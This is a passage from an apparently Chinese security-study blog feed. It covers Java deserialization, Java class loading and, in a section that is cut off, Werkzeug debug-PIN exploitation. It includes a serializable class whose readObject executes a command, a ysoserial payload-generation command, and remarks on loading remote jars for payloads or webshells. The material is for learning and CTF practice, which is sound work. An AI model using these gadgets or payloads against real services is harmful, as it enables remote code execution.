<li><p>有想过为什么在反序列化的时候要引入包吗，</p>
</li>
<li><p>同时可以看给出来的ser.ser文件的十六进制表示，其中并没有序列化方法，并且只存在sex（这是因为其他两个变量都被我设置为了static，所以不会被序列化），那么是否想过为什么在序列化的时候没有序列化方法。</p>
</li>
</ul>
<p><img src="/2024/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240702220120590.png" alt="image-20240702220120590"></p>
<p>个人理解如下，对于序列化，它只序列化对象的的状态，而方法属于类的定义部分，不属于对象的状态部分，所以方法并不是被序列化，所以，如果我们想要再次利用这个Test类，需要引入包，从而使得可以对应到方法来利用。</p>
<p>两种不同结果的利用方法最大的不同在于一个地方，引入包的次数。</p>
<p>对于分开利用，在序列化的时候对应得Test类的this.name被我们利用setName()方法将其赋值为了haha，但是我们在另外使用反序列化的时候，又重新引入了一个包，此时两个“Test类”是不同的，所以此时的this.name对应static的fupanc</p>
<p>对于综合利用，此时序列化和反序列化时在一起的，所以我们利用时只引入了一次包。此时利用的方法所属的”Test类”是同一个，所以此时的this.name被我们赋值为了haha，并且在最后调用getName()方法时会返回这个haha，这也就是为什么综合利用时返回的name的值为haha而不是fupanc</p>
<p>（本质应该是和对象有关，暂时这样浅显理解应对一下，后面学到深处再来看看）</p>
<h3 id="一个知识点"><a href="#一个知识点" class="headerlink" title="一个知识点"></a>一个知识点</h3><p>这里需要注意的一个点，我们可以通过在待<strong>序列化或反序列化的类中定义<code>readObject</code>和<code>writeObject</code>方法，来实现自定义的序列化和反序列化操作</strong>，当然前提是，被序列化的类必须有此方法，并且方法的修饰符必须是<code>private</code>。代码参考如下：</p>
<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        stream.defaultReadObject();<span class="comment">//调用ObjectInputStream默认反序列化方法</span></span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">        haha.cmd = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;haha.ser&quot;</span>));</span><br><span class="line">        obj.writeObject(haha);</span><br><span class="line">        obj.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ceshi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;haha.ser&quot;</span>));</span><br><span class="line">        ceshi.readObject();</span><br><span class="line">        ceshi.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机</p>
<p><img src="/2024/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240707143657470.png" alt="image-20240707143657470"></p>
<p>这样就确实自定义了反序列化的方法，序列化同理。</p>
<h3 id="ysoserial项目"><a href="#ysoserial项目" class="headerlink" title="ysoserial项目"></a>ysoserial项目</h3><p>ysoserial集合了各种java反序列化的利用链。</p>
<p>利用链也叫”gadget chains”，我们通常称为gadget。</p>
<p>直接下载编译好的jar文件就能用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial</span><br></pre></td></tr></table></figure>

<p>使用很简单，如下简单POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot; </span><br></pre></td></tr></table></figure>



<p>参考文章：</p>
<p><code>https://javasec.org/javase/JavaDeserialization/Serialization.html</code></p>
<p><code>https://blog.csdn.net/mocas_wang/article/details/107621010</code></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java反序列化调用链分析</category>
        <category>Java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>Java类加载机制</title>
    <url>/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="Java类加载机制"><a href="#Java类加载机制" class="headerlink" title="Java类加载机制"></a>Java类加载机制</h1><p>JVM（java虚拟机）把描述类的数据从Class文件加载到内存，并对数据进行校验、解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这就是虚拟机的类加载机制。</p>
<span id="more"></span>

<h2 id="Java类"><a href="#Java类" class="headerlink" title="Java类"></a>Java类</h2><p>Java是编译型语言，我们编写的java文件需要被编译成class文件后才能被JVM运行，这里先了解一下java类。</p>
<p>给一个Main.java，内容如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;haha&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>javac</code>命令将其编译为字节代码的class文件，结果如下：</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240610213338979.png" alt="image-20240610213338979"></p>
<p>这样就生成了一个字节码文件 ，用十六进制工具打开看一下</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240610214237726.png" alt="image-20240610214237726"></p>
<p>这里就可以看到生成的字节码，我们可以通过JDK自带的<code>javap</code>命令反汇编<code>Main.class</code>文件对应的<code>com.anbai.sec.classloader.Main</code>类，</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240610220932036.png" alt="image-20240610220932036"></p>
<p>JVM在执行Main之前会先解析class二进制内容，JVM执行的其实就是如上<code>javap</code>命令生成的字节码。</p>
<h2 id="类加载的时机"><a href="#类加载的时机" class="headerlink" title="类加载的时机"></a>类加载的时机</h2><p>（具体可参考《深入理解Java虚拟机》一书）</p>
<p>类加载过程如下表示：</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240617202845692.png" alt="image-20240617202845692"></p>
<p><strong>其中 从验证到解析 为连接， 从加载到初始化 为类加载</strong></p>
<h4 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h4><p>加载过程：</p>
<ol>
<li>通过类的全限定名（包名+类名）来获取定义此类的二进制字节流</li>
<li>将这个字节流所代表的静态存储结构转化为运行时的数据结果</li>
<li>在内存中生成一个代表这个类的<code>java.lang.Class</code>对象，作为方法区这个类的各种数据的访问入口</li>
</ol>
<h4 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h4><p>这一阶段的目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。从整体上看，验证阶段大致上会完成4个阶段的校验工作：<strong>文件格式、元数据、字节码、符号引用</strong>。可以通过设置参数略过。</p>
<h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p>准备阶段是正式为<strong>类中定义的变量</strong>（即静态变量–被static修饰的变量）分配内存并设置类变量初始值的阶段。</p>
<p>这里需要注意的点：</p>
<ul>
<li>此时进行内存分配的仅包括类变量（静态变量），而不包括实例变量，<strong>实例变量将会在对象实例化时随着对象一起分配在Java堆中</strong>。</li>
</ul>
<p>也就是说类变量随着类的加载为存在于方法区</p>
<ul>
<li>其次就是<strong>这里说的初始值“通常情况”下是数据类型的零值</strong>，比如如下代码：</li>
</ul>
<p><code>public satic int value = 123;</code>，<strong>在准备阶段过后的初始值为0而不是123</strong>。把value赋值为123的指令在初始化阶段才会被执行。</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240617210503958.png" alt="image-20240617210503958"></p>
<p>但是在一些特殊情况，如果类变量同时被<code>static</code>和<code>final</code>修饰，比如：</p>
<p><code>public static final int value = 123;</code></p>
<p>那么在准备阶段虚拟机就会将value赋值为123，并且在定义这个变量的时候必须为其显式的赋值。</p>
<h4 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h4><p>解析阶段是Java虚拟机将常量池内的符号引用替换为直接引用的过程</p>
<ul>
<li>符号引用就是一组符号来描述目标，可以是任何字面量。</li>
<li>直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。</li>
</ul>
<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>执行类构造器<code>&lt;clinit&gt;()</code>方法的过程</p>
<p>会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的<code>native</code>方法（<code>defineClass0/1/2</code>）来定义一个<code>java.lang.Class</code> 实例</p>
<p>其中包括：</p>
<ul>
<li>执行static语句块中的语句</li>
<li>完成static属性的赋值操作</li>
<li>当类的直接父类还没有被初始化，则先初始化其直接父类</li>
</ul>
<h2 id="ClassLoader类加载器分类"><a href="#ClassLoader类加载器分类" class="headerlink" title="ClassLoader类加载器分类"></a>ClassLoader类加载器分类</h2><p>一切的Java类都必须经过JVM加载后才能运行，<strong>而<code>ClassLoader</code>的主要作用就是Java类文件的加载</strong>。</p>
<p>类加载器类型包括四种，分别如下：</p>
<ul>
<li><strong>Bootstrap ClassLoader（启动类加载器）</strong>：最顶层的类加载器，主要加载核心类库。这个类加载器负责加载存放在 jre\lib 目录下的部分jar包（如rt.jar、tools.jar）或者被<code>-Xbootclasspath</code> 参数所指定的路径中存放的类库。</li>
<li><strong>Extension ClassLoader（扩展类加载器）</strong>：这个加载器由<code>sun.misc.Launcher$ExtClassLoader</code>实现，它负责加载 jre\lib\ext 目录中的，或者被 <code>java.ext.dirs</code> 系统变量所指定的路径中的所有类库</li>
<li><strong>Application ClassLoader（系统类加载器）</strong>：这个类加载器由 sun.misc.Launcher$AppClassLoader 实现。它负责加载用户类路径（ClassPath）上所指定的类库。需要注意的是如果应用程序中没有自定义自己的类加载器，一般情况下<code>AppClassLoader</code>是默认的类加载器。</li>
<li><strong>用户自定义加载器</strong></li>
</ul>
<p><strong>在Java虚拟机角度来看，存在两种不同的类加载器：</strong></p>
<p>一种是启动类加载器，这个加载器使用C++语言实现，是虚拟机自身的一部分。所以当使用<code>getClassLoader()</code>方法时会返回null（后面会说）</p>
<p>还有一种是其他所有的类加载器，这些类加载器都由Java语言实现，独立存在于虚拟机外部，并且全都继承自抽象类 <code>java.lang.ClassLoader</code>。</p>
<p>获取类加载器的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取 Test 类的类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">testClassLoader</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Test&quot;</span>).getClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;Test 类的类加载器: &quot;</span> + testClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取当前类的类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">currentClassLoader</span> <span class="operator">=</span> Main.class.getClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;Main 类的类加载器: &quot;</span> + currentClassLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取系统类加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(<span class="string">&quot;系统类加载器: &quot;</span> + systemClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Output:</span></span><br><span class="line"><span class="comment">Test 类的类加载器: sun.misc.Launcher$AppClassLoader@18b4aac2</span></span><br><span class="line"><span class="comment">Main 类的类加载器: sun.misc.Launcher$AppClassLoader@18b4aac2</span></span><br><span class="line"><span class="comment">系统类加载器: sun.misc.Launcher$AppClassLoader@18b4aac2</span></span><br></pre></td></tr></table></figure>



<h2 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h2><p><strong>双亲委派模型要求除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器</strong>。注意这里的父子关系一般不是以继承关系实现，只是通过使用组合关系来复用父加载器的代码。</p>
<p>双亲委派模型的工作流程图</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240615191909820.png" alt="image-20240615191909820"></p>
<p>即如果一个类加载器收到了类加载的请求，它不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一层次的加载器都是如此，知道传送到最顶层的启动类加载器，<strong>只有当父加载器反馈自己无法完成这个加载请求的时候（即它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去完成加载。</strong></p>
<p><strong>双亲委派模型的优点：</strong></p>
<p>1、这样就是能够实现有些类避免重复加载使用，直接先给父加载器加载，不用子加载器再次重复加载。</p>
<p>2、保证java核心库的类型安全。比如网络上传输了一个java.lang.Object类，通过双亲模式传递到启动类当中，然后发现其Object类早已被加载过，所以就不会加载这个网络传输过来的java.lang.Object类，保证我们的java核心API库不被篡改，出现类似用户自定义java.lang.Object类的情况。</p>
<p><strong>双亲委派模型实现代码</strong></p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240619132441306.png" alt="image-20240619132441306"></p>
<p>这段代码的逻辑就是先检查请求加载的类型是否被加载过，如果没有就调用父加载器的loadClass() 方法，若父加载器为空则默认使用启动类加载器为父加载器。假如父加载器加载失败，才调用自己的findClass()方法加载。</p>
<p>最后通过上述步骤我们找到了对应的类，并且接收到的resolve参数的值为true,那么就会调用resolveClass(Class)方法来处理类。</p>
<h2 id="类加载器核心方法"><a href="#类加载器核心方法" class="headerlink" title="类加载器核心方法"></a>类加载器核心方法</h2><ul>
<li><p><code>loadClass</code>：加载指定的Java类</p>
</li>
<li><p><code>findClass</code>：查找指定的Java类</p>
</li>
<li><p><code>findLoadedClass</code>：查找JVM已经加载过的类</p>
</li>
<li><p><code>defineClass</code>：定义一个Java类</p>
</li>
<li><p><code>resolveClass</code>：链接指定的Java类</p>
</li>
</ul>
<h2 id="类加载的方式"><a href="#类加载的方式" class="headerlink" title="类加载的方式"></a>类加载的方式</h2><ul>
<li>命令行启动应用时由JVM初始化加载</li>
<li>通过<code>Class.forName()</code>方法动态加载</li>
<li>通过<code>ClassLoader.loadClass()</code>方法动态加载。</li>
</ul>
<p>通过Class.forName方法动态加载会执行类中的static块，而ClassLoader.loadClass()方法动态加载不会执行</p>
<p><strong>利用加载器获取Class对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="调试类加载过程"><a href="#调试类加载过程" class="headerlink" title="调试类加载过程"></a>调试类加载过程</h2><p>测试代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        cl.loadClass(<span class="string">&quot;haha&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">haha</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打断点后调试</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240619142601798.png" alt="image-20240619142601798"></p>
<p>得到当前类加载器为系统类加载器，强制步入loadClass()方法，继续调试</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240619144442824.png" alt="image-20240619144442824"></p>
<p>可以知道Application ClassLoader(系统类加载器)的父加载器为Extension ClassLoader（扩展类加载器），在这里调用了扩展类加载器的<code>loadClass()</code>方法。</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240619144859156.png" alt="image-20240619144859156"></p>
<p>此时可以知道扩展类加载器并没有加载过ceshi这个类，并且没有父加载器（为null），所以这里调用了启动类加载器。</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240619145500241.png" alt="image-20240619145500241"></p>
<p>再在启动类加载器看过后也没有加载过这个类，然后就给扩展类加载器自己加载</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240619145812227.png" alt="image-20240619145812227"></p>
<p>这里就可以看出扩展类也没有加载，随后就回到了系统类加载器</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240619150033092.png" alt="image-20240619150033092"></p>
<p>最后由系统类加载器加载，如下：</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240619150123908.png" alt="image-20240619150123908"></p>
<p>最后结束。</p>
<p>现在我们来看一下<code>sun.misc.Launcher</code>类，这个类里面有类加载器的源码，看下面这两个代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">AppClassLoader</span> <span class="keyword">extends</span> <span class="title class_">URLClassLoader</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ExtClassLoader</span> <span class="keyword">extends</span> <span class="title class_">URLClassLoader</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>看一下URLClassLoader</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoader</span> <span class="keyword">extends</span> <span class="title class_">SecureClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>SecureClassLoader</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecureClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>从这些代码片段可以看出上面介绍的类加载器在使用时为什么不是继承关系，而是组合关系，叫作父加载器是为了更好学习。</p>
<p>继承图如下：</p>
<p><img src="/2024/06/19/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240619153615018.png" alt="image-20240619153615018"></p>
<h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>URLClassLoader 继承了 ClassLoader，URLClassLoader 提供了加载远程资源的能力，在写漏洞利用的 payload 或者 webshell 的时候我们可以使用这个特性来加载远程的 jar 来实现远程的类方法调用。</p>
<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;nivia&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>javac编译生成Test.class文件</p>
<p>Main.java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlclassloader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file://C:\\Windows\\System32\\cmd.exe&quot;</span>)&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> urlclassloader.loadClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功输出haha，本地加载成功，网络传输class文件是差不多的，在这里对于传参类型看源码很容易看出来，这里不多说</p>
<p>——————————</p>
<p>参考文章：</p>
<p><code>https://www.javasec.org/javase/ClassLoader/</code></p>
<p><code>https://blog.csdn.net/briblue/article/details/54973413</code></p>
<p><code>https://xz.aliyun.com/t/9002?time__1311=n4%2BxuDgD9DyAGQD7DnGDlP6eKxGuCRDRBOfTD#toc-16</code></p>
<p><code>https://blog.csdn.net/TJtulong/article/details/89598598</code></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java基础</category>
        <category>Java类加载机制</category>
      </categories>
  </entry>
  <entry>
    <title>Python Debug PIN码的利用及做题笔记</title>
    <url>/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>利用pin码可以在报错界面执行任意python代码</p>
<span id="more"></span>

<p><strong>先了解一下debug是什么</strong>：debug是由bug词得来的，bug就是程序故障。debug就是排除程序故障的意思。</p>
<p>而解决程序故障通常都是通过工具（即debug调试器）来对代码进行调试，一步步找出程序中出现bug的位置。</p>
<p><a href="https://zhuanlan.zhihu.com/p/62610785">参考文章</a></p>
<h3 id="PIN码的利用"><a href="#PIN码的利用" class="headerlink" title="PIN码的利用"></a>PIN码的利用</h3><h4 id="PIN是什么"><a href="#PIN是什么" class="headerlink" title="PIN是什么"></a>PIN是什么</h4><p><strong>PIN是 Werkzeug（它是 Flask 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。 您可以使用浏览器中的调试器引脚来启动交互式调试器。</strong><br>引用<br>请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。<br>引用<br>调试器 PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。</p>
<p><strong>werkzeug不同版本</strong>以及python不同版本都会影响PIN码的生成</p>
<p>但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法</p>
<h4 id="pin码的生成算法"><a href="#pin码的生成算法" class="headerlink" title="pin码的生成算法"></a>pin码的生成算法</h4><p>一个简单的flask测试程序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;haha&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>这是一个基本的使用flask框架创建web应用的示例，解析一下这串代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask: 这行代码导入了 Flask 框架，使我们可以在代码中使用 Flask 的功能。</span><br><span class="line"></span><br><span class="line">app = Flask(__name__): 这行代码创建了一个应用对象 app，它是 Flask 类的一个实例。__name__ 参数是用来确定应用的根目录，通常是 Python 模块的名称。这样做是为了告诉 Flask 在哪里寻找模板、静态文件等。</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;): 这是一个装饰器，用于告诉 Flask 应用如何响应来自根 URL（&quot;/&quot;）的请求。在这个例子中，根 URL 的请求会被传递到 hello() 函数进行处理。</span><br><span class="line"></span><br><span class="line">def hello(): 这是一个视图函数，用于处理根 URL 的请求。视图函数负责处理请求并返回响应。</span><br><span class="line"></span><br><span class="line">return &#x27;haha&#x27; :一个简单的字符串作为 HTTP 响应的主体内容。</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;: :这是 Python 中的一个惯用法，用于检查当前模块是否被直接运行。如果是，则执行下面的代码块。</span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;, port=8080, debug=True): 这行代码启动了 Flask 应用的开发服务器。host=&quot;0.0.0.0&quot; 参数指定了服务器监听所有公共 IP 地址，port=8080 参数指定了服务器监听的端口号，debug=True 参数启用了调试模式，这样在代码发生变化时，服务器会自动重启以加载最新的代码。</span><br></pre></td></tr></table></figure>

<p>运行后就会在控制台看到PIN码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> * Serving Flask app <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> * Debug mode: on</span><br><span class="line">WARNING: This <span class="keyword">is</span> a development server. Do <span class="keyword">not</span> use it <span class="keyword">in</span> a production deployment. Use a production WSGI server instead.</span><br><span class="line"> * Running on <span class="built_in">all</span> addresses (<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>)</span><br><span class="line"> * Running on http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span></span><br><span class="line"> * Running on http://<span class="number">192.168</span><span class="number">.173</span><span class="number">.123</span>:<span class="number">8080</span></span><br><span class="line">Press CTRL+C to quit</span><br><span class="line"> * Restarting <span class="keyword">with</span> stat</span><br><span class="line"> * Debugger <span class="keyword">is</span> active!</span><br><span class="line"> * Debugger PIN: xxx-xxx-xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而在源代码中PIN码生成的具体代码跟进参考<a href="https://xz.aliyun.com/t/8092?time__1311=n4+xuDgDBADQYiKP40HwbDyiDcDjr2qGIKNUQYx&alichlgref=https://www.google.com.hk/">文章</a></p>
<p>PIN码一般都是固定的，只要掌握了下面几个元素，就可以利用脚本生成PIN码</p>
<p>PIN码生成要素：</p>
<p>利用PIN值的关键代码在<code>Lib\site-packages\werkzeug\debug\__init__.py</code>,可以查看</p>
